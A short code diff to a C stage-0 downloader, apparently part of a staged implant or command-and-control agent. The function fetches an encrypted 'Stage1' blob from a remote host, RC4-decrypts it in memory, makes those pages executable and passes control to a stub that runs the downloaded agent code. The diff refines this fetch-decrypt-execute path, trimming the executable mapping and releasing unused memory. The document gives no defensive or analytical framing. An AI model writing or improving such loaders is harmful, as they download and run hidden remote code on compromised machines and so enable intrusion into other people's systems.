@@ -62,6 +62,10 @@ void downloader_main(struct download_result *res) {
   debug_print("Stage0: Downloading Stage1 blob from %s:%s%s via %s\n", host,
               port, path, transport_name());
 
+  /* Reserve the maximum payload size up front because the download length is
+   * unknown until the transfer finishes. Anonymous pages are only backed when
+   * written, so the untouched tail costs no physical memory; it is released
+   * right after the download. */
   void *stage_blob =
       (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -86,11 +90,19 @@ void downloader_main(struct download_result *res) {
   rc4_init(&rc4, key, DERIVED_KEY_LEN);
   rc4_crypt(&rc4, (uint8_t *)stage_blob, downloaded_size);
 
-  if (mprotect(stage_blob, MAX_STAGE_BLOB_SIZE, PROT_READ | PROT_EXEC) != 0) {
+  /* Flip only the pages that hold the payload to RX: the W^X transition must
+   * scale with the agent PIC, not with the whole reservation. */
+  size_t exec_size = PAGE_ALIGN_UP(downloaded_size);
+  if (mprotect(stage_blob, exec_size, PROT_READ | PROT_EXEC) != 0) {
     debug_print("Stage0: mprotect failed\n");
     munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
     return;
   }
+
+  /* Drop the unused reservation tail so the surviving agent PIC mapping is
+   * only as large as the payload. */
+  if (exec_size < MAX_STAGE_BLOB_SIZE)
+    munmap((uint8_t *)stage_blob + exec_size, MAX_STAGE_BLOB_SIZE - exec_size);
 
   debug_print("Stage0: downloaded %d bytes, handing off to stub\n",
               (int)downloaded_size);
